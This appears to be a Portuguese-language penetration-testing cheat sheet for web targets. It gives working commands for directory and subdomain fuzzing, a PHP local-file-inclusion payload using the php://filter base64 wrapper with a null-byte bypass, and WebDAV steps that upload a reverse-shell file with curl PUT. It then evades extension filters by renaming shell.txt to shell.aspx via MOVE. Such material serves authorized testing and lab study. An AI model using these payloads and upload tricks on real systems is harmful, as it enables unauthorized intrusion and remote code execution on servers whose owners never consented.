Enumeração de diretórios e arquivos:  
```bash
feroxbuster -u http://$RHOST/ -A -r -x txt -q -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -C 404 --dont-scan 'manual'`  
```

Enumeração de subdomínio:
```bash
wfuzz -u https://$RHOST -H "Host: FUZZ.dominio.com" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

## PHP  
Erro de include em PHP, faça o teste com filter para converter o arquivo em Base64:  
`http://$RHOST/?param=php://filter/read=convert.base64-encode/resource=[LFI]`  
Para ignorar a extensão no final da URL caso a mesma seja adicionada automaticamente, utilize Null Byte:  
`%00`

## Javascript
Desofuscação de código:
https://lelinhtinh.github.io/de4js/

# Webdav
Validar se é possível enviar arquivo ao servidor:
```shell
davtest -url $RHOST
```
Realizar upload caso seja possível:
``` bash
curl -X PUT http://$RHOST/<SHELL>.<EXT> -d @<SHELL>.<EXT>
```
Caso não seja possível subir uma extensão específica, podemos fazer o upload em um formato permitido e alterar a extensão do arquivo utilizando a opção de mover.
```bash
# Subir código da shell reversa em ASPX e armazenar no formato TXT
curl -X PUT http://$RHOST/shell.txt -d @shell.aspx
# Alterar a extensão do TXT para ASPX utilizando a opção MOVE
curl -X MOVE -H 'Destination:http://$RHOST/shell.aspx' http://$RHOST/shell.txt
```

# Bypass Regex
https://github.com/attackercan/regexp-security-cheatsheet